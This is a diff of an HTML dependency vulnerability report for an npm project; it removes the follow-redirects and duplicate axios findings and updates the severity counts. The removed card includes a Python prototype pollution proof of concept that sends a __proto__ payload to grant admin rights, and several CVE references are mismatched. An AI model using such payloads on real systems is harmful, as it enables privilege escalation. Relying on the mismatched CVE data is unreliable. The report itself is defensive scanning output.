@@ -258,7 +258,7 @@
                 <h1>Dependency Vulnerability Report</h1>
                 <div class="metadata">
                     <p><strong>Project:</strong> package</p>
-                    <p><strong>Scan Time:</strong> 2026-04-04T20:26:58.903914</p>
+                    <p><strong>Scan Time:</strong> 2026-04-04T20:59:56.953509</p>
                 </div>
                 
                 <div class="summary">
@@ -268,11 +268,11 @@
                     </div>
                     <div class="stats-card high">
                         <div class="label">High</div>
-                        <div class="score">2</div>
+                        <div class="score">1</div>
                     </div>
                     <div class="stats-card medium">
                         <div class="label">Medium</div>
-                        <div class="score">2</div>
+                        <div class="score">1</div>
                     </div>
                     <div class="stats-card low">
                         <div class="label">Low</div>
@@ -285,97 +285,6 @@
                 <h3>Detailed Vulnerability Findings</h3>
                 <div id="findings-container">
                     
-                        <div class="finding-card">
-                            <div class="finding-header high">
-                                <div>
-                                    <div class="finding-title">follow-redirects @ 1.10.0</div>
-                                    <div class="finding-meta">
-                                        <div class="meta-item"><strong>CVE:</strong> CVE-2021-33901</div>
-                                        <div class="meta-item"><span class="severity-badge high">HIGH</span></div>
-                                        <div class="meta-item"><strong>Type:</strong> Transitive</div>
-                                        <div class="meta-item"><strong>Effort:</strong> medium</div>
-                                    </div>
-                                </div>
-                                <button class="finding-toggle" onclick="toggleDetails(this, event)">▲</button>
-                            </div>
-                            <div class="finding-details">
-                                <div class="description-section">
-                                    <div class="label">Description</div>
-                                    <div class="detail-value">follow-redirects dependency contains prototype pollution vulnerability.</div>
-                                </div>
-                                <div class="detail-grid">
-                                    <div class="detail-item">
-                                        <div class="detail-label">Current Version</div>
-                                        <div class="detail-value code">1.10.0</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Patched Version</div>
-                                        <div class="detail-value code">1.14.0</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Patch Status</div>
-                                        <div class="detail-value">[OK] Available</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Fix Effort</div>
-                                        <div class="detail-value">medium</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Ecosystem</div>
-                                        <div class="detail-value">npm</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Recommended Version</div>
-                                        <div class="detail-value code">1.14.0</div>
-                                    </div>
-                                </div>
-                                <div class="reference-links">
-                                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33901" target="_blank" rel="noopener noreferrer" class="ref-link">NVD Details</a>
-                                    <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-33901" target="_blank" rel="noopener noreferrer" class="ref-link">CVE Mitre</a>
-                                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-33901" target="_blank" rel="noopener noreferrer" class="ref-link">Additional Reference</a>
-                                </div>
-                                
-                            <div class="poc-section">
-                                <div class="poc-header">Proof of Concept (PoC)</div>
-                                <div class="poc-code"><code>
-# Prototype Pollution PoC - CVE-2021-23337 (lodash)
-# Vulnerable: lodash.merge() with user-controlled input
-
-import requests
-import json
-
-target = &quot;http://vulnerable-app.local/api/config&quot;
-
-# Prototype pollution payload
-# This modifies Object.prototype, affecting all objects
-payload = {
-    &quot;admin&quot;: {
-        &quot;__proto__&quot;: {
-            &quot;isAdmin&quot;: True
-        }
-    }
-}
-
-response = requests.post(
-    target,
-    json=payload,
-    headers={&quot;Content-Type&quot;: &quot;application/json&quot;}
-)
-
-# If vulnerable, subsequent requests will have isAdmin=true
-verify_response = requests.get(target)
-data = verify_response.json()
-
-if data.get(&quot;isAdmin&quot;):
-    print(&quot;[+] Prototype Pollution successful!&quot;)
-    print(&quot;[+] User now has admin privileges&quot;)
-</code></div>
-                            </div>
-                        
-                            </div>
-                        </div>
-                    
-
                         <div class="finding-card">
                             <div class="finding-header high">
                                 <div>
@@ -520,70 +429,14 @@ if data.get(&quot;isAdmin&quot;):
                             </div>
                         </div>
                     
-
-                        <div class="finding-card">
-                            <div class="finding-header medium">
-                                <div>
-                                    <div class="finding-title">axios @ 0.20.0</div>
-                                    <div class="finding-meta">
-                                        <div class="meta-item"><strong>CVE:</strong> GHSA-95c9-f9f2-q643</div>
-                                        <div class="meta-item"><span class="severity-badge medium">MEDIUM</span></div>
-                                        <div class="meta-item"><strong>Type:</strong> Direct</div>
-                                        <div class="meta-item"><strong>Effort:</strong> medium</div>
-                                    </div>
-                                </div>
-                                <button class="finding-toggle" onclick="toggleDetails(this, event)">▲</button>
-                            </div>
-                            <div class="finding-details">
-                                <div class="description-section">
-                                    <div class="label">Description</div>
-                                    <div class="detail-value">Axios vulnerable to data exposure via URL parameters in server-side requests.</div>
-                                </div>
-                                <div class="detail-grid">
-                                    <div class="detail-item">
-                                        <div class="detail-label">Current Version</div>
-                                        <div class="detail-value code">0.20.0</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Patched Version</div>
-                                        <div class="detail-value code">0.21.1</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Patch Status</div>
-                                        <div class="detail-value">[OK] Available</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Fix Effort</div>
-                                        <div class="detail-value">medium</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Ecosystem</div>
-                                        <div class="detail-value">npm</div>
-                                    </div>
-                                    <div class="detail-item">
-                                        <div class="detail-label">Recommended Version</div>
-                                        <div class="detail-value code">0.21.1</div>
-                                    </div>
-                                </div>
-                                <div class="reference-links">
-                                    <a href="https://nvd.nist.gov/vuln/detail/GHSA-95c9-f9f2-q643" target="_blank" rel="noopener noreferrer" class="ref-link">NVD Details</a>
-                                    <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=GHSA-95c9-f9f2-q643" target="_blank" rel="noopener noreferrer" class="ref-link">CVE Mitre</a>
-                                    <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41773" target="_blank" rel="noopener noreferrer" class="ref-link">Additional Reference</a>
-                                </div>
-                                
-                            </div>
-                        </div>
-                    
                 </div>
                 
                 <div class="remediation">
                     <h3>Remediation Plan</h3>
                     <p>Prioritize fixes based on severity and exploitability:</p>
                     <ol id="remediation-list">
-                        <li><strong>[HIGH] follow-redirects</strong>: Update from 1.10.0 to 1.14.0 (Effort: medium)</li>
-<li><strong>[HIGH] lodash</strong>: Update from 4.17.20 to 4.17.21 (Effort: low)</li>
+                        <li><strong>[HIGH] lodash</strong>: Update from 4.17.20 to 4.17.21 (Effort: low)</li>
 <li><strong>[MEDIUM] axios</strong>: Update from ^0.20.0 to 0.21.1 (Effort: medium)</li>
-<li><strong>[MEDIUM] axios</strong>: Update from 0.20.0 to 0.21.1 (Effort: medium)</li>
                     </ol>
                 </div>
                 
